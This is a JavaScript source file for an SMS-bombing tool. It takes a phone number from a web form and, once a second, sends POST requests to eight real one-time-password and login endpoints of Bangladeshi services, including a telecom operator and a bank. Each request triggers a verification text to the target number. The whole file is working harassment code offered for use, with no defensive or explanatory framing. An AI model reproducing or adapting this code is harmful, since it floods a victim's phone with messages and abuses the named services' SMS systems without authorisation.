let totalAttempts = 0;
let intervalId = null;

function startSendingOTP() {
    const phoneNumber = document.getElementById('phoneNumberInput').value;

    if (phoneNumber.trim() === '') {
        alert('Please enter a phone number.');
        return;
    }

    const apiEndpoints = [
        "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
        "https://fundesh.com.bd/api/auth/resendOTP",
        "https://api.shikho.com/auth/v2/send/sms",
        "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
        "https://themallbd.com/api/auth/otp_login",
        "https://bikroy.com/data/phone_number_login/verifications/phone_login"
        // Add other endpoints here...
    ];

    const jsonPayloads = {
        "https://weblogin.grameenphone.com/backend/api/v1/otp": { "msisdn": phoneNumber },
        "https://developer.quizgiri.xyz/api/v2.0/send-otp": { "country_code": "+880", "phone": phoneNumber },
        "https://fundesh.com.bd/api/auth/generateOTP?service_key=": { "msisdn": phoneNumber },
        "https://fundesh.com.bd/api/auth/resendOTP": { "msisdn": phoneNumber },
        "https://api.shikho.com/auth/v2/send/sms": { "phone": phoneNumber, "email": null, "auth_type": "login" },
        "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber": {
            "AccessToken": "",
            "TrackingNo": "",
            "mobileNo": phoneNumber,
            "otpSms": "",
            "product_id": "201",
            "requestChannel": "MOB",
            "trackingStatus": 5
        },
        "https://themallbd.com/api/auth/otp_login": { "phone_number": "+880" + phoneNumber },
        "https://bikroy.com/data/phone_number_login/verifications/phone_login": {}
        // Add other JSON payloads here...
    };

    // Clear previous interval if exists
    clearInterval(intervalId);

    // Reset statistics
    totalAttempts = 0;
    updateStats(); // Update initial stats display

    // Start sending OTP requests continuously
    intervalId = setInterval(() => {
        totalAttempts++;

        apiEndpoints.forEach(endpoint => {
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(jsonPayloads[endpoint])
            })
            .catch(error => {
                console.error(`Error sending request to ${endpoint}:`, error);
            });

            updateStats(); // Update total attempts after each request
        });
    }, 1000); // Interval time in milliseconds (e.g., 1000 = 1 second)
}

function stopSendingOTP() {
    clearInterval(intervalId);
}

function updateStats() {
    const totalAttemptsElement = document.getElementById('totalAttempts');
    totalAttemptsElement.textContent = totalAttempts;
}
